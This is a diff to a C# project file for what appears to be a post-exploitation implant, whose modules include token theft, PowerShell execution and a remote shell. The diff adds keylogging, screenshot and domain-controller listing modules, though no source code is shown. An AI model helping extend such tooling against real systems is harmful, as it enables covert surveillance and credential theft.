@@ -35,8 +35,10 @@
   <ItemGroup>
     <Reference Include="System" />
     <Reference Include="System.Core" />
+    <Reference Include="System.Drawing" />
     <Reference Include="System.Management" />
     <Reference Include="System.Runtime.Serialization" />
+    <Reference Include="System.Windows.Forms" />
     <Reference Include="System.Xml.Linq" />
     <Reference Include="System.Data.DataSetExtensions" />
     <Reference Include="Microsoft.CSharp" />
@@ -54,10 +56,12 @@
     <Compile Include="exit.cs" />
     <Compile Include="jobkill.cs" />
     <Compile Include="jobs.cs" />
+    <Compile Include="keylog.cs" />
     <Compile Include="link.cs" />
     <Compile Include="load.cs" />
     <Compile Include="ls.cs" />
     <Compile Include="make_token.cs" />
+    <Compile Include="net_dclist.cs" />
     <Compile Include="powerpick.cs" />
     <Compile Include="ppid.cs" />
     <Compile Include="Properties\AssemblyInfo.cs" />
@@ -67,6 +71,7 @@
     <Compile Include="register_assembly.cs" />
     <Compile Include="rev2self.cs" />
     <Compile Include="run.cs" />
+    <Compile Include="screenshot.cs" />
     <Compile Include="shell.cs" />
     <Compile Include="sleep.cs" />
     <Compile Include="steal_token.cs" />
